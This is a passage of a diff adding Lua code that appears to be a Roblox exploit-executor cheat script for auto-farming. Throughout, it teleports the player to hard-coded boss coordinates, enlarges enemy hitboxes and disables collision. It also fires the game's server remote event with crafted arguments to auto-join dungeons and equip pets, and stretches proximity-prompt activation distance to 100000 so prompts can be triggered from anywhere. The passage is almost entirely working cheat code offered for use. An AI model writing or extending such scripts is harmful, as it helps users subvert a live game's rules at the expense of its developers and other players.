+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3466.06177, 31.1063576, 2909.89917, -0.952053607, -7.08286564e-07, 0.3059313,
+                            -5.63032586e-07, 1, 5.6303287e-07, -0.3059313, 3.63788189e-07, -0.952053607))
+                        if checkmon == "Black Crow" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Black Crow" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Shark Man" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3101.74048, 61.2719383, -2168.64844, -0.2563169, -6.88546493e-07, 0.966592789,
+                            -5.63039464e-07, 1, 5.63039521e-07, -0.966592789, -3.99913347e-07, -0.2563169))
+                        if checkmon == "Shark Man" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Shark Man" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Eminel" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3051.69897, 56.4804459, -2395.51245, 0.744364321, -4.31234071e-08, 0.667773724,
+                            5.63039521e-07, 1, -5.63039691e-07, -0.667773724, 7.95089647e-07, 0.744364321))
+                        if checkmon == "Eminel" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Eminel" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Light Admiral" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(-3531.06787, 56.4716454, -2255.06836, -0.903998554, 1.33815178e-07, 0.427535534,
+                            2.80851054e-07, 1, 2.80850969e-07, -0.427535534, 3.73962649e-07, -0.903998554))
+                        if checkmon == "Light Admiral" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Light Admiral" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Luryu" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(2837.84253, 45.4265251, -2619.34546, -0.624081612, 8.85594957e-08, -0.781359136,
+                            -5.63077037e-07, 1, 5.63077208e-07, 0.781359136, 7.91371519e-07, -0.624081612))
+                        if checkmon == "Luryu" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Luryu" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Fyakuya" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(3160.59204, 45.4265251, -2680.88013, 0.835139036, 1.60515114e-07, -0.550038934,
+                            -5.63012918e-07, 1, -5.63012748e-07, 0.550038934, 7.79872948e-07, 0.835139036))
+                        if checkmon == "Fyakuya" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Fyakuya" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Genji" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(3259.47266, 45.4265251, -3403.26514, 0.894789875, -1.48554005e-08, -0.446487486,
+                            2.95679286e-08, 1, 2.59843418e-08, 0.446487486, -3.6452235e-08, 0.894789875))
+                        if checkmon == "Genji" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Genji" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Sortudo" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(17.8078575, 38.3894615, 4514.37793, 0.126498997, -2.55685421e-07, 0.991966724,
+                            -2.95430482e-07, 1, 2.9543034e-07, -0.991966724, -3.30428861e-07, 0.126498997))
+                        if checkmon == "Sortudo" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Sortudo" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Michille" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(340.151093, 37.8531151, 4579.06885, -0.31399861, 7.1135679e-07, -0.949423432,
+                            5.63039862e-07, 1, 5.63039634e-07, 0.949423432, -3.57769579e-07, -0.31399861))
+                        if checkmon == "Michille" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Michille" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Wind" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(99.631485, 39.7339172, 5281.9126, -0.643656731, 7.09105441e-09, -0.765314341,
+                            6.50590266e-08, 1, -4.54514222e-08, 0.765314341, -7.90457193e-08, -0.643656731))
+                        if checkmon == "Wind" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Wind" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Ant King" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(3853.75659, 60.120388, 3014.19092, -0.0192575548, 0, 0.99981457, 0, 1, 0,
+                            -0.99981457, 0, -0.0192575548))
+                        if checkmon == "Ant King" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Ant King" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Golyne" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(5021.55518, 42.3494492, -99.8139114, -0.197694629, 6.63237245e-07, 0.98026365,
+                            5.63039805e-07, 1, -5.63039634e-07, -0.98026365, 4.40617526e-07, -0.197694629))
+                        if checkmon == "Golyne" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Golyne" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Gosuke" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(5254.06299, 42.5919189, -268.24823, 0.186909959, 4.54264466e-07, 0.982377052,
+                            5.71065925e-07, 1, -5.71066266e-07, -0.982377052, 6.67740039e-07, 0.186909959))
+                        if checkmon == "Gosuke" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Gosuke" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Diablo" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(5505.86328, 42.3494301, -568.690796, -0.519175768, -7.73517741e-07, 0.854667485,
+                            -5.63032188e-07, 1, 5.63031904e-07, -0.854667485, -1.88892784e-07, -0.519175768))
+                        if checkmon == "Diablo" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Diablo" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Heaven" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(111.102547, 34.8954315, -4671.54346, -0.156150669, -4.67592798e-07, 0.987733245,
+                            5.62293337e-07, 1, 5.62292769e-07, -0.987733245, 6.43198234e-07, -0.156150669))
+                        if checkmon == "Heaven" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Heaven" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Ika" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(189.133453, 33.8965111, -4755.54883, 0.671566963, -7.95298888e-07, -0.740943909,
+                            5.63039293e-07, 1, -5.63039009e-07, 0.740943909, -3.90621153e-08, 0.671566963))
+                        if checkmon == "Ika" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Ika" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Bosses"] and _G['Select Bosses'] == "Zere" then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        local checkmon = v.HealthBar.Main.Title.Text
+                        TP(CFrame.new(604.185364, 34.895504, -5270.18066, 0.346854508, 0, -0.937918961, 0, 1, 0,
+                            0.937918961, 0, 0.346854508))
+                        if checkmon == "Zere" then
+                            if v.HumanoidRootPart.Size == Vector3.new(4, 4, 2) then
+                                if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 650 then
+                                    repeat
+                                        wait()
+                                        TP(v.HumanoidRootPart.CFrame * pos)
+                                    until not getgenv().Config["Auto Farm Bosses"] or _G['Select Bosses'] ~= "Zere" or v.HealthBar.Enabled == false
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] or getgenv().Config["Auto Farm Bosses"] or getgenv().Config["Auto Farm [ Nearest ]"] or getgenv().Config["Auto Farm Dungeon"] then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        v.Hitbox.Size = Vector3.new(20, 20, 20)
+                    end
+                end
+                for i, v in pairs(game.workspace.__Main.__Enemies.Server["1"]:GetChildren()) do
+                    if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 9999999999999999 then
+                        v.Size = Vector3.new(20, 20, 20)
+                    end
+                end
+                for i, v in pairs(game.workspace.__Main.__Enemies.Server["2"]:GetChildren()) do
+                    if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 9999999999999999 then
+                        v.Size = Vector3.new(20, 20, 20)
+                    end
+                end
+                for i, v in pairs(game.workspace.__Main.__Enemies.Server["3"]:GetChildren()) do
+                    if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 9999999999999999 then
+                        v.Size = Vector3.new(20, 20, 20)
+                    end
+                end
+                for i, v in pairs(game.workspace.__Main.__Enemies.Server["4"]:GetChildren()) do
+                    if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 9999999999999999 then
+                        v.Size = Vector3.new(20, 20, 20)
+                    end
+                end
+                for i, v in pairs(game.workspace.__Main.__Enemies.Server["5"]:GetChildren()) do
+                    if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 9999999999999999 then
+                        v.Size = Vector3.new(20, 20, 20)
+                    end
+                end
+            end)
+        end
+    end
+end)
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm"] or getgenv().Config["Auto Farm Bosses"] or getgenv().Config["Auto Farm [ Nearest ]"] or getgenv().Config["Auto Farm Dungeon"] or getgenv().Config["Auto Farm Rank"] then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetDescendants()) do
+                    if v:IsA("BasePart") and v:FindFirstChild("HealthBar") then
+                        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 9999999999999999 then
+                            v.CanCollide = false
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.AutoFarm:AddSection("Rank")
+Tabs.AutoFarm:AddToggle("Auto Farm Rank", {
+    Title = "Auto Farm Rank",
+    Description = "",
+    Default = getgenv().Config["Auto Farm Rank"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Farm Rank"] = Value
+        Update_Setting(getgenv()['MyName'])
+        StopTween(getgenv().Config["Auto Farm Rank"])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm Rank"] and game.PlaceId == 128336380114944 then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") and v:FindFirstChild("HealthBar") then
+                        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 99999999 then
+                            if v.HealthBar.Enabled == true then
+                                repeat
+                                    wait()
+                                    TP(v.HumanoidRootPart.CFrame * pos)
+                                until not getgenv().Config["Auto Farm Rank"] or v.HealthBar.Enabled == false or game.PlaceId ~= 128336380114944
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.AutoFarm:AddToggle("Auto Join Rank", {
+    Title = "Auto Join Rank",
+    Description = "",
+    Default = getgenv().Config["Auto Join Rank"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Join Rank"] = Value
+        Update_Setting(getgenv()['MyName'])
+        StopTween(getgenv().Config["Auto Join Rank"])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Join Rank"] and game.PlaceId ~= 128336380114944 then
+            pcall(function()
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "DungeonAction",
+                            ["Action"] = "TestEnter"
+                        },
+                        [2] = "\n"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+                local args = {
+                    [1] = {
+                        [1] = {
+                            ["Event"] = "DungeonAction",
+                            ["Action"] = "TestEnter"
+                        },
+                        [2] = "\t"
+                    }
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent")
+                    :FireServer(unpack(args))
+            end)
+        end
+    end
+end)
+Tabs.AutoFarm:AddSection("Farm Nearest")
+Tabs.AutoFarm:AddToggle("Auto Farm [ Nearest ]", {
+    Title = "Auto Farm Nearest",
+    Description = "",
+    Default = getgenv().Config["Auto Farm [ Nearest ]"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Farm [ Nearest ]"] = Value
+        Update_Setting(getgenv()['MyName'])
+        StopTween(getgenv().Config["Auto Farm [ Nearest ]"])
+    end
+})
+Tabs.AutoFarm:AddSlider("Distance",
+    {
+        Title = "Distance",
+        Description = "",
+        Default = getgenv().Config["Distance"] or 200,
+        Min = 50,
+        Max = 1000,
+        Rounding = 0,
+        Callback = function(Value)
+            getgenv().Config["Distance"] = Value
+            Update_Setting(getgenv()['MyName'])
+        end
+    })
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Farm [ Nearest ]"] then
+            pcall(function()
+                for i, v in pairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= getgenv().Config["Distance"] then
+                        repeat
+                            wait()
+                            TP(v.HumanoidRootPart.CFrame * pos)
+                        until not getgenv().Config["Auto Farm [ Nearest ]"] or v.HealthBar.Enabled == false
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.AutoFarm:AddSection("Settings")
+--[[]
+Tabs.AutoFarm:AddSlider("Tween Speed",
+    {
+        Title = "Tween Speed",
+        Description = "",
+        Default = getgenv().Config["Tween Speed"] or 200,
+        Min = 200,
+        Max = 1000,
+        Rounding = 0,
+        Callback = function(Value)
+            getgenv().Config["Tween Speed"] = Value
+            Update_Setting(getgenv()['MyName'])
+        end
+    })
+    --]]
+getgenv().Config["Tween Speed"] = 9999999999999999999
+Tabs.AutoFarm:AddToggle("Auto Destroy", {
+    Title = "Auto Destroy",
+    Description = "",
+    Default = getgenv().Config["Auto Destroy"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Destroy"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Destroy"] and game.PlaceId ~= 128336380114944 then
+            pcall(function()
+                for i, v in ipairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") then
+                        local rootPart = v:FindFirstChild("HumanoidRootPart")
+                        local DestroyPrompt = rootPart and rootPart:FindFirstChild("DestroyPrompt")
+                        if DestroyPrompt then
+                            DestroyPrompt:SetAttribute("MaxActivationDistance", 100000)
+                            fireproximityprompt(DestroyPrompt)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+Tabs.AutoFarm:AddToggle("Auto Arise", {
+    Title = "Auto Arise",
+    Description = "",
+    Default = getgenv().Config["Auto Arise"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Arise"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Arise"] and game.PlaceId ~= 128336380114944 then
+            pcall(function()
+                for i, v in ipairs(game.workspace.__Main.__Enemies.Client:GetChildren()) do
+                    if v:IsA("Model") then
+                        local rootPart = v:FindFirstChild("HumanoidRootPart")
+                        local DestroyPrompt = rootPart and rootPart:FindFirstChild("ArisePrompt")
+                        if DestroyPrompt then
+                            DestroyPrompt:SetAttribute("MaxActivationDistance", 100000)
+                            fireproximityprompt(DestroyPrompt)
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+--[[]
+Tabs.AutoFarm:AddToggle("Auto Equip Best", {
+    Title = "Auto Equip Best",
+    Description = "",
+    Default = getgenv().Config["Auto Equip Best"] or false,
+    Callback = function(Value)
+        getgenv().Config["Auto Equip Best"] = Value
+        Update_Setting(getgenv()['MyName'])
+    end
+})
+spawn(function()
+    while wait() do
+        if getgenv().Config["Auto Equip Best"] then
+            pcall(function()
+                for i,v in pairs(game:GetService("Players").LocalPlayer.leaderstats.Inventory.Pets:GetChildren()) do
+                    for i = 1, 20 do
+                        local args = {
+                            [1] = {
+                                [1] = {
+                                    ["Event"] = "EquipBest",
+                                    ["Pets"] = {
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        
+                                    }
+                                },
+                                [2] = "\5"
+                            }
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+                        local args = {
+                            [1] = {
+                                [1] = {
+                                    ["Event"] = "EquipBest",
+                                    ["Pets"] = {
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        
+                                    }
+                                },
+                                [2] = "\4"
+                            }
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+                        local args = {
+                            [1] = {
+                                [1] = {
+                                    ["Event"] = "EquipBest",
+                                    ["Pets"] = {
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        
+                                    }
+                                },
+                                [2] = "\n"
+                            }
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("BridgeNet2"):WaitForChild("dataRemoteEvent"):FireServer(unpack(args))
+                        local args = {
+                            [1] = {
+                                [1] = {
+                                    ["Event"] = "EquipBest",
+                                    ["Pets"] = {
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        [i] = v.Name,
+                                        
+                                    }
+                                },
+                                [2] = "\t"
+                            }
+                        }
